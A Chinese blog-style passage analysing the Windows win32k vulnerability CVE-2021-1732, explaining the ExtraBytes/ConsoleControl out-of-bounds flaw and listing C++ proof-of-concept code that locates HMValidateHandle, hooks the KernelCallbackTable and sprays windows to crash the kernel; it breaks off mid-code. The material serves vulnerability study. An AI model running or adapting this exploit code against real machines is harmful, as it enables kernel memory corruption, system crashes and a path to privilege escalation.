<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>经过上面的介绍，我们可以发现在调用 <code>CreateWindowEx</code> 的时候分配给 <code>ExtraBytes</code> 的用户空间堆是通过用户态函数 <code>_xxxClientAllocWindowClassExtraBytes</code> 来申请的，此后在 <code>SetWindowLongPtr / GetWindowLongPtr</code> 的时候会按照 <code>ExtraBytes + index</code> 的方式来计算写入地址并写入 <code>value</code> 。</p>
<p>然而 <code>_xxxClientAllocWindowClassExtraBytes</code> 函数是可以被 <code>hook</code> 的，也就意味着我们可以控制其的返回值。同时在 <code>hook</code> 中我们可以使用 <code>ConsoleControl</code> 来将 <code>flags</code> 设为 <code>1</code> ，这样 <code>SetWindowLongPtr / GetWindowLongPtr</code> 便会按照内核空间堆的相对偏移逻辑，即 <code>ExtraBytes + index + DesktopBaseAddr</code> 来计算写入地址并写入 <code>value</code> 。而 <code>ExtraBytes</code> 我们又可控，那么我们就可以相对 <code>DesktopBaseAddr</code> 进行越界读写。</p>
<p>可以用 <a target="_blank" rel="noopener" href="https://iamelli0t.github.io/2021/03/25/CVE-2021-1732.html"><code>iamelli0t</code></a> 的一张图进行归纳：</p>
<p><img src="https://s2.loli.net/2022/05/04/8FywSN7d6IajUYv.png" alt="Untitled 1.png"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="HMValidateHandle使用"><a href="#HMValidateHandle使用" class="headerlink" title="HMValidateHandle使用"></a>HMValidateHandle使用</h2><p>如果我们需要调用 <code>ConsoleControl</code> 方法，那么我们需要传入 <code>tagWND</code> 的 <code>handle</code> ，但是我们此时处在 <code>CreateWindowEx</code> 函数中，还没有返回 <code>handle</code> ，而只是在 <code>tagWND</code> 和 <code>tagWNDk</code> 中存储了 <code>handle</code> ，所以我们可以泄露 <code>tagWNDk</code> 中存储的 <code>handle</code> 来进行利用。那么我们该怎么泄露呢？可以使用长久以来一直被使用的未公开函数 <code>user32!HMValidateHandle</code> 泄露信息。当我们把窗口的句柄和类型传入该函数，就可以得到 <code>tagWNDk</code> 在用户空间的只读映射指针。通过 <code>free</code> 再进行占位就可以获得接下来的新的 <code>tagWNDk</code> 的内容。</p>
<p>我们可以使用 <code>user32!IsMenu</code> 的第一个 <code>call</code> 来计算 <code>HMValidateHandle</code> 的地址，如下所示：</p>
<p><img src="https://s2.loli.net/2022/05/04/bmg6Qlf1TJCBUSx.png" alt="Untitled 2.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp">代码</a> 如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>* (NTAPI* lHMValidateHandle)(HWND h, <span class="type">int</span> type);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>* (__fastcall* lHMValidateHandle)(HWND h, <span class="type">int</span> type);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">lHMValidateHandle pHmValidateHandle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">FindHMValidateHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HMODULE hUser32 = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hUser32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to load user32&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BYTE* pIsMenu = (BYTE*)<span class="built_in">GetProcAddress</span>(hUser32, <span class="string">&quot;IsMenu&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pIsMenu == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to find location of exported function &#x27;IsMenu&#x27; within user32.dll\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> uiHMValidateHandleOffset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">        BYTE* test = pIsMenu + i;</span><br><span class="line">        <span class="keyword">if</span> (*test == <span class="number">0xE8</span>) &#123;</span><br><span class="line">            uiHMValidateHandleOffset = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (uiHMValidateHandleOffset == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to find offset of HMValidateHandle from location of &#x27;IsMenu&#x27;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> addr = *(<span class="type">unsigned</span> <span class="type">int</span>*)(pIsMenu + uiHMValidateHandleOffset);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset = ((<span class="type">unsigned</span> <span class="type">int</span>)pIsMenu - (<span class="type">unsigned</span> <span class="type">int</span>)hUser32) + addr;</span><br><span class="line">    <span class="comment">//The +11 is to skip the padding bytes as on Windows 10 these aren&#x27;t nops</span></span><br><span class="line">    pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + <span class="number">11</span>);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL bFound = <span class="built_in">FindHMValidateHandle</span>();</span><br><span class="line"><span class="keyword">if</span> (!bFound) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to locate HmValidateHandle, exiting\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Found location of HMValidateHandle in user32.dll\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>当然也可以不用 IsMenu 而用别的函数来寻找 HMValidateHandle 的地址</p>
</blockquote>
<h2 id="BSOD"><a href="#BSOD" class="headerlink" title="BSOD"></a>BSOD</h2><p>整合上面所说的内容，编写如下代码即可 <code>BSOD</code> ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;poc.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LOADSTRING 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CB_WND_EXTRA_1 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CB_WND_EXTRA_2 0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NAME_1 <span class="string">L&quot;ClassName1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NAME_2 <span class="string">L&quot;ClassName2&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPRAY_WND_SIZE 0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CB_WND_EXTRA_OFFSET 0xc8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_EXTRA_BYTES 0x23456780;</span></span><br><span class="line"></span><br><span class="line">HINSTANCE hInst;                               </span><br><span class="line">WCHAR szTitle[MAX_LOADSTRING];                  </span><br><span class="line">WCHAR szWindowClass[MAX_LOADSTRING];            </span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK    <span class="title">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> ULONG* (NTAPI* lHMValidateHandle)(HWND h, <span class="type">int</span> type);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> ULONG* (__fastcall* lHMValidateHandle)(HWND h, <span class="type">int</span> type);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">lHMValidateHandle pHmValidateHandle = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(status) (status == (NTSTATUS)0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">ULONG</span><span class="params">(WINAPI* PxxxClientAllocWindowClassExtraBytes)</span><span class="params">(PULONG pSize)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtUserConsoleControl)</span><span class="params">(DWORD, PVOID, ULONG)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtCallbackReturn)</span><span class="params">(PVOID Result, ULONG ResultLength, NTSTATUS Status)</span></span>;</span><br><span class="line"></span><br><span class="line">PxxxClientAllocWindowClassExtraBytes xxxClientAllocWindowClassExtraBytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">PVOID</span><span class="params">(WINAPI* FHMValidateHandle)</span><span class="params">(HANDLE h, BYTE byType)</span></span>;</span><br><span class="line"></span><br><span class="line">HWND hWnds[SPRAY_WND_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PULONG pWnds[SPRAY_WND_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">FindHMValidateHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HMODULE hUser32 = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hUser32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to load user32&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BYTE* pIsMenu = (BYTE*)<span class="built_in">GetProcAddress</span>(hUser32, <span class="string">&quot;IsMenu&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pIsMenu == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to find location of exported function &#x27;IsMenu&#x27; within user32.dll\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> uiHMValidateHandleOffset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">        BYTE* test = pIsMenu + i;</span><br><span class="line">        <span class="keyword">if</span> (*test == <span class="number">0xE8</span>) &#123;</span><br><span class="line">            uiHMValidateHandleOffset = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (uiHMValidateHandleOffset == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to find offset of HMValidateHandle from location of &#x27;IsMenu&#x27;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> addr = *(<span class="type">unsigned</span> <span class="type">int</span>*)(pIsMenu + uiHMValidateHandleOffset);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset = ((<span class="type">unsigned</span> <span class="type">int</span>)pIsMenu - (<span class="type">unsigned</span> <span class="type">int</span>)hUser32) + addr;</span><br><span class="line">    <span class="comment">//The +11 is to skip the padding bytes as on Windows 10 these aren&#x27;t nops</span></span><br><span class="line">    pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + <span class="number">11</span>);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">MyxxxClientAllocWindowClassExtraBytes</span><span class="params">(PULONG pSize)</span> </span>&#123;</span><br><span class="line">    PNtUserConsoleControl NtUserConsoleControl = (PNtUserConsoleControl)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;win32u.dll&quot;</span>), <span class="string">&quot;NtUserConsoleControl&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NtUserConsoleControl) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get NtUserConsoleControl : %p\n&quot;</span>, err);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PNtCallbackReturn NtCallbackReturn = (PNtCallbackReturn)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCallbackReturn&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NtCallbackReturn) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get NtCallbackReturn : %p\n&quot;</span>, err);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*pSize == CB_WND_EXTRA_2) &#123;</span><br><span class="line">        HWND cHwd = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; SPRAY_WND_SIZE; i++) &#123;</span><br><span class="line">            PULONG cbWndExtra = *(PULONG*)((PBYTE)(pWnds[i]) + CB_WND_EXTRA_OFFSET);</span><br><span class="line">            <span class="keyword">if</span> (cbWndExtra == (PULONG)CB_WND_EXTRA_2) &#123;</span><br><span class="line">                cHwd = (HWND)*(PULONG*)(pWnds[i]);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] Find cHwd : %p\n&quot;</span>, cHwd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cHwd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find cHwd!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">        ULONG64 params[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        params[<span class="number">0</span>] = (ULONG)cHwd;</span><br><span class="line">        params[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS status = <span class="built_in">NtUserConsoleControl</span>(<span class="number">6</span>, params, <span class="built_in">sizeof</span>(params));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get NtUserConsoleControl : %p\n&quot;</span>, status);</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">        ULONG64 result[<span class="number">3</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        result[<span class="number">0</span>] = FAKE_EXTRA_BYTES;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">NtCallbackReturn</span>(result, <span class="built_in">sizeof</span>(result), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">end:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">xxxClientAllocWindowClassExtraBytes</span>(pSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hookXxxClientAllocWindowClassExtraBytes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">    PLONG pKernelCallbackTable = (PLONG) * (PLONG*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x58</span>); <span class="comment">// PEB-&gt;KernelCallbackTable</span></span><br><span class="line">    xxxClientAllocWindowClassExtraBytes = (PxxxClientAllocWindowClassExtraBytes)*(PLONG*)((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>, <span class="number">0x400</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    *(PLONG*)((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>) = (PLONG)MyxxxClientAllocWindowClassExtraBytes;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>, <span class="number">0x400</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(hPrevInstance);</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(lpCmdLine);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">AllocConsole</span>();</span><br><span class="line">    FILE* tempFile = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">freopen_s</span>(&amp;tempFile, <span class="string">&quot;conin$&quot;</span>, <span class="string">&quot;r+t&quot;</span>, stdin);</span><br><span class="line">    <span class="built_in">freopen_s</span>(&amp;tempFile, <span class="string">&quot;conout$&quot;</span>, <span class="string">&quot;w+t&quot;</span>, stdout);</span><br><span class="line"></span><br><span class="line">    BOOL bFound = <span class="built_in">FindHMValidateHandle</span>();</span><br><span class="line">    <span class="keyword">if</span> (!bFound) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to locate HmValidateHandle, exiting\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Found location of HMValidateHandle in user32.dll\n&quot;</span>);</span><br><span class="line">    <span class="built_in">hookXxxClientAllocWindowClassExtraBytes</span>();</span><br><span class="line">    <span class="built_in">LoadStringW</span>(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);</span><br><span class="line"></span><br><span class="line">    WNDCLASSEXW wcex = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    wcex.cbSize = <span class="built_in">sizeof</span>(WNDCLASSEX);</span><br><span class="line">    wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcex.lpfnWndProc = WndProc;</span><br><span class="line">    wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">    wcex.cbWndExtra = CB_WND_EXTRA_1;</span><br><span class="line">    wcex.hInstance = hInstance;</span><br><span class="line">    wcex.lpszMenuName = <span class="built_in">MAKEINTRESOURCEW</span>(IDC_POC);</span><br><span class="line">    wcex.lpszClassName = CLASS_NAME_1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RegisterClassExW</span>(&amp;wcex);</span><br><span class="line">    wcex.hInstance = hInstance;</span><br><span class="line">    wcex.cbWndExtra = CB_WND_EXTRA_2;</span><br><span class="line">    wcex.lpszClassName = CLASS_NAME_2;</span><br><span class="line">    <span class="built_in">RegisterClassExW</span>(&amp;wcex);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SPRAY_WND_SIZE; i++) &#123;</span><br><span class="line">        HWND hWnd = <span class="built_in">CreateWindowEx</span>(<span class="literal">NULL</span>, CLASS_NAME_1, <span class="literal">NULL</span>, WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!hWnd)</span><br><span class="line">        &#123;</span><br><span class="line">            DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to CreateWindowEx, error : %p\n&quot;</span>, err);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        hWnds[i] = hWnd;</span><br><span class="line">        pWnds[i] = (PULONG)<span class="built_in">pHmValidateHandle</span>(hWnd, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; SPRAY_WND_SIZE; i++) &#123;</span><br><span class="line">        <span class="built_in">DestroyWindow</span>(hWnds[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HWND hWnd = <span class="built_in">CreateWindowEx</span>(<span class="literal">NULL</span>, CLASS_NAME_2, <span class="literal">NULL</span>, WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hWnd)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to CreateWindowEx, error : %p\n&quot;</span>,err);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HACCEL hAccelTable = <span class="built_in">LoadAccelerators</span>(hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDC_POC));</span><br><span class="line"></span><br><span class="line">    MSG msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">nullptr</span>, <span 